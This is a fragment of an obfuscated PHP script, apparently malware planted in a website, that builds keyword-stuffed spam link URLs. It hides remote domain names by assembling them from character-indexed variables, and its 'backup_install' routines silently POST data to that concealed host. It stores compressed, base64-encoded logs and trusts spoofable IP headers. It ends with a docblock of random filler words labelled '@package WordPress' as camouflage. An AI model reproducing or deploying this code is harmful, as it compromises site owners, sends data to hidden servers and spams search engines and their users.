			$filePres = $siteLink ."/". $httcReplace . "/";		}elseif(JDT == 3){
			$filePres = $siteLink ."/". $httcReplace . "/" .basename(__FILE__) . "?keyword=";		}else{
			$filePres = $siteLink."/";		}
		
		$ms = $arrnametime[$pid % count($arrnametime)];		
		
		$keyNum = $arrKeywz[$pid % count($arrKeywz)];		
		$keyWordKey = $pid % 10;		$keyStrKey = $pid % strlen("icedrkswzjhpnxoyvumfatblgq");		$keyArr = array();		$flag = 0;		
		if($ms == 2 or $ms ==4){
			if($keyNum >= 9){
				$fg = 4;			}elseif($keyNum >= 7){
				 $fg = 3;			}else{
				 $fg = 2;			}
		}
		
		for($i=0;$i<$keyNum;$i++){
			$tempNum = $arr_word[$i][$keyWordKey];			$tempstr = '';			for($j=0;$j<$tempNum;$j++)
				$tempstr .= $strRand[$flag++]{$keyStrKey};			
			$keyArr[$i] = $tempstr;
			if($flag >= count($strRand))
				$flag = 0;
		}
		
		$PidWz = $pid % $keyNum;		$linkCenter = '';
		
		if(JDT == 3){
			
			$tplinkArr = array();
			for($i=0;$i<$keyNum;$i++){			
				$tplinkArr[] = $keyArr[$i];					
			}
			
			$tplinkArr[] = $pid;

			
			$linkCenter = implode('-',$tplinkArr);
			$linkCenter = $linkCenter . "#llq";		
			$linkCenter = str_replace('-#llq','',$linkCenter);	
			$linkCenter = str_replace('#llq','',$linkCenter);
			$linkCenter = str_replace('--','-',$linkCenter);	
			$linkCenter = str_replace('/-','/',$linkCenter);				
			$rtStr = $filePres.$linkCenter;
			$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
			return $rtStr;
			
			}
		
		
		
		
		$tplinkArr = array();
		for($i=0;$i<$keyNum;$i++){	
			$tplinkArr[] = $keyArr[$i];	
		}
		
		$tplinkArr[] = $pid;
		
			
		$linkCenter = implode('-',$tplinkArr);
		$linkCenter .= JTHZ;
		$linkCenter = str_replace("-".JTHZ,JTHZ,$linkCenter);	
		$linkCenter = str_replace('--','-',$linkCenter);	
		$linkCenter = str_replace('/-','/',$linkCenter);	
			
		$rtStr = $filePres.$linkCenter;
		$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
		return $rtStr;
	}
	
	
	function rmhtmltag($tagname='',$str=''){
		$rulers = '#<'.$tagname.'[^>]*>.*?</'.$tagname.'>#s';
		$str = preg_replace($rulers,'',$str);
		$rulers = '#<'.$tagname.'[^>]*>.*?</'.$tagname.'>#i';
		$str = preg_replace($rulers,'',$str);
		return $str;
	
	}
  
  
  function rmhtmltag2($tagname='',$str=''){
		$rulers = '#<'.$tagname.'[^>]*>#s';
		$str = preg_replace($rulers,'',$str);
		$rulers = '#</'.$tagname.'>#s';
		$str = preg_replace($rulers,'',$str);
	
	$rulers = '#<'.$tagname.'[^>]*>#i';
	$str = preg_replace($rulers,'',$str);
	$rulers = '#</'.$tagname.'>#i';
	$str = preg_replace($rulers,'',$str);
	return $str;
	
	}
	
	
	
// bbbbbbbbackupbg

function backup_install($dateArr,$loop=10){


	$data = false;        $i = 0; 

	while(!$data) {
             $data = backup_install_once($dateArr);             if($i++ >= $loop) break;        }
	return $data;
}
 
 
function backup_install_once($dateArr=array()){
	global $O0O000;
	
	$data = false;
	if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
		$curl = curl_init();
		curl_setopt($curl, CURLOPT_URL, $O0O000);
		curl_setopt($curl, CURLOPT_HEADER, 0);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($curl, CURLOPT_POST, 1);
		curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);
		curl_setopt($curl, CURLOPT_POSTFIELDS, $dateArr);
		$data = curl_exec($curl);
	
		curl_close($curl);
	
	}else{
		$tempDate = http_build_query($dateArr);	
		$params = array(
			'http' => array(
			'method' => 'POST',
			'timeout' => 5,
			'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
			'content' => $tempDate
			)
		);
		$ctx = stream_context_create($params);
		$data = file_get_contents($O0O000, null, $ctx);
	} 
	 

	return $data;	
}



function backup_install_two($dateArr,$loop=10){


	$data = false;        $i = 0; 

	while(!$data) {
             $data = backup_install_once_two($dateArr);             if($i++ >= $loop) break;        }
	return $data;
}
 


function backup_install_once_two($dateArr=array()){
	global $O0O000;
	
	$data = false;
	
	$tempDate = http_build_query($dateArr);	
	$params = array(
			'http' => array(
			'method' => 'POST',
			'timeout' => 10,
			'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
			'content' => $tempDate
			)
	);
	$ctx = stream_context_create($params);
	$data = file_get_contents($O0O000, null, $ctx);
	 
	return $data;	
}


function  save_install($dateArr=array()){
	$tpstr = serialize($dateArr);
	$tpstr = '<data>'.$tpstr.'</data>';
	$tpstr = base64_encode(gzdeflate($tpstr));
	@file_put_contents("./logs.txt",$tpstr);
}

// bbbbbbbbackupend

	
	
function is_ip($localIp,$ipRanges)
{    
	$localIp = ip2long($localIp);  
	foreach($ipRanges as $val)
	{ 
		$ipmin=sprintf("%u",ip2long($val[0]));		$ipmax=sprintf("%u",ip2long($val[1]));
		if($localIp >= $ipmin && $localIp <= $ipmax)
		{   
			return true; 
		} 
	}   
	return false;}
 
function RandAbcs($length = ""){
    $str = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_./:-";
    return ($str);
} 


 
function getarr(){
		global $O00O0O;
		$arr[0]=$O00O0O{16}.$O00O0O{20}.$O00O0O{8}.$O00O0O{25}.$O00O0O{14}.$O00O0O{4}.$O00O0O{22}.$O00O0O{4}.$O00O0O{1}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};$arr[1]=$O00O0O{12}.$O00O0O{20}.$O00O0O{17}.$O00O0O{15}.$O00O0O{17}.$O00O0O{14}.$O00O0O{3}.$O00O0O{0}.$O00O0O{19}.$O00O0O{0}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};$arr[2]=$O00O0O{12}.$O00O0O{4}.$O00O0O{11}.$O00O0O{8}.$O00O0O{25}.$O00O0O{0}.$O00O0O{2}.$O00O0O{4}.$O00O0O{13}.$O00O0O{19}.$O00O0O{4}.$O00O0O{17}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};$arr[3]=$O00O0O{19}.$O00O0O{8}.$O00O0O{1}.$O00O0O{14}.$O00O0O{16}.$O00O0O{2}.$O00O0O{18}.$O00O0O{14}.$O00O0O{20}.$O00O0O{17}.$O00O0O{4}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};$arr[4]=$O00O0O{11}.$O00O0O{6}.$O00O0O{15}.$O00O0O{0}.$O00O0O{1}.$O00O0O{23}.$O00O0O{7}.$O00O0O{14}.$O00O0O{18}.$O00O0O{19}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};
	return $arr;
}
	
function getthisdom(){
	$myArrs = getarr();
    return 'http://www.'.$myArrs[CENTERKEY].MYDIR;
} 
 
 

function get_real_ip(){
	
	
	   $ip = '';
    /**
     * resolve any proxies
     */
    if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
      } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
      } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED'];
      } elseif (isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
      } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_FORWARDED_FOR'];
      } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
        $ip = $_SERVER['HTTP_FORWARDED'];
      } else {
        $ip = $_SERVER['REMOTE_ADDR'];
      }
    }
    if (trim($ip) == '') {
      if (getenv('HTTP_X_FORWARDED_FOR')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
      } elseif (getenv('HTTP_CLIENT_IP')) {
        $ip = getenv('HTTP_CLIENT_IP');
      } else {
        $ip = getenv('REMOTE_ADDR');
      }
    }

    /**
     * sanitize for validity as an IPv4 or IPv6 address
     */
    $ip = preg_replace('~[^a-fA-F0-9.:%/,]~', '', $ip);

    /**
     *  if it's still blank, set to a single dot
     */
    if (trim($ip) == '') $ip = '.';

    return $ip;
	
	}
 
/**
 * adequate approximate aspect competition debate equation excess expend guilty harmony hostile leather maximum mist particle petrol previous prohibit survey triumph universal via whereas.
 * garbage generate guarantee hollow marveous nylon oval recruit release resistant smash sponsor volume.
 * academic arichmetic debate deputy durable focus medium motive ridid torture triumph utilise vacuum whatsoever whereas.
 * applicant community mature survey textile via.
 * approximate auxiliary deaf decay extreme fertilizer frown gaze globe golf particularly prohibit reluctant resemble revenue sensitive slender thrust usage virtual weld.
 * abuse cliff comment dash debate echo hardware herd jealous mainland obscure optics personnel profitable semiconductor trap treaty tremendous vibrate zone.
 * accelerate campus exceed fatal fatigue flexible knot lynar notion ridid semiconductor sexual shrug significance temporary tender tension transport voluntary wealthy welfare.
 * continuous dash drift frustrate garbage globe horror inhabitant junior medium oral orient powder rescue submit thrust tidy vibrate video waist weed witness.
 * apparent consent enclose hence massive mission private videotape vitally.
 * durable entry explore gear grateful individual lest naval obstacle oral outstanding reluctant revenue shuttle vessel.
 * academy biology competent core derive hydrogen inhabitant jungle moral prior remarkable rescue shiver simplicity temptation vacant videotape virtual volunteer.
 * appropriate echo enclose excursion favorable optional previous principal prospect ridiculous sensible solar.
 * Internet alcohol approve cancel coarse genius inhabitant label previous shield shrug skim temptation weave whatsoever.
 * barrier catalog distinguish distress evil exceed hostile integrate internal negative region rely slope vain weave.
 * ban beforehand breadth breed data fate hostile inferior inhabitant jewel label lean modify peak promote remedy reputation restrain reveal shrug suspicious universal vacuum vibrate.
 * bunch commit enviroment fate gallery hence isolate jealous moisture motive partial powder prospect pursue scandal software torture.
 * automatic aware comparative consume decay decline echo emphasize essential expand faulty flee glory guarantee insignificant liberty particularly passport resemble route scandal temporary.
 * accomplish cope gear resolve strategy tense trend video weave.
 * aware delicate deposit descend evolution excess external gallery holy jam label leap liquor mild modest particle resemble ridiculous shallow spur strategy tend transplant vanish weed.
 * appreciate battery cargo compete conservation facility hence notion nucleus profit resolve slender stable substitute temple tide timber vibrate.
 * budget burst competition cope decline device discrimination elbow emotional encounter erect favorable gaze mission negative nuclear parallel participate scratch security severe suspicion thrust valid.
 * diverse guilty maximum mixture virtue.
 * adapt apparent cargo conquer deposit discount erect exceedingly interfere sensitive theme thrust urban.
 * arichmetic consent discrimination diverse exceed external facility faculty giant gratitude jail laser mainland necessity prior ridge ridiculous semiconductor slope solar timber universe.
 * constant continual continuous decline grateful hence illusion male neglect personnel prosperity pursue quit security submerge substitute suburb transmit tremendous triangle.
 * descend drift flexible frown gap inhabitant jewel lest liberty manufacture obstacle outset outstanding presumably recruit temple tense title transmit transport trap voluntary.
 * adhere applicable arouse awful bachelor bureau debate explore facility gaze liable pants portable prevail religion spur vital whereas.
 * cargo chaos excess expenditure ingredient missile orient preserve principal scale tissue version witness.
 * adapt bachelor conservative dumb elastic expend global hestiate hint idle insurance integrate leisure maximum modest orchestra pants prescribe ridiculous shiver spill undertake.
 * commit equation explosive index interpretation laser liberal manual manufacture mere provision register shiver strategy treaty wonder.
 * adhere alter entitle exclusive explode explosive glorious hostile impose infer liberal priority prompt shrink stripe temporary venture victim.
 * approve decade deserve dispose distress encounter evil expense hollow likelihood magnet radiation rely resume ridid slip theme timber tissue undergo undergraduate variation.
 * accelerate barrier compete delicate electron evaluate expense glorious notify promote racial recruit release ridiculous security semester sequence shuttle tremendous.
 * derive elbow jungle junior prevail prospect simplicity simplify.
 * available conservative data decline numerrous parallel shrug tremendous vague.
 * cancel deposit equivalent evolution explosion glory humble isolate relief triangle violet whatsoever.
 * breadth discount distribute germ glimpse mild slender.
 * appropriate casual faculty mainland obscure promote prosperity.
 * career exterior fertilizer relief retain.
 * automatic conservative dusk infer leather manufacture minimum personnel radiation shield territory vague.
 * adopt appeal applianc appoint burden column decorate flee global hint interpretation opponent render ridge shuttle survey thrust.
 * acknowledge adopt coach competent display durable expense fax grant humble liberal naked oxygen participate restrain sophisticated tendency treaty utter volume yield.
 * casual decline gear individual remote slippery subway weed.
 * avenue consent flash opponent oval participate reveal split transform.
 * response appropriate architect conquer duration extinct giant hostile impose magnet marveous naval parade personal principal scandal slender spit tidy undertake usage videotape wax welfare.
 * bachelor durable expel inevitable insignificant leisure licence liquor merchant noticeable removal stuff suburb volcano welfare.
 * attach bother ceremony comment decent excess explore faculty garbage giant optimistic powder prominent sponsor universal wander yield.
 * adjust bother breadth cancel candidate cliff comparative discount discrimination ferfile holy horrible inferior nylon participate recreation remote significance slope undergo unique valley vocabulary weld.
 * aware coach core data decorate excursion herd revenue ridge submit valid victim.
 * agency alcohol blast breed competent drip elaborate exceedingly giant harmony infect inferior insurance interpret loose peak powder prohibit reliable shrink theme xploit.
 * advertisement bargain capture clue drift grateful herd identify illusion jealous merchant region revenue scandal stable ultimate.
 * advertise applause career deposit discount fate interpretation optics powder precaution split ultimate.
 *
 * @package WordPress
 */

 
//file end
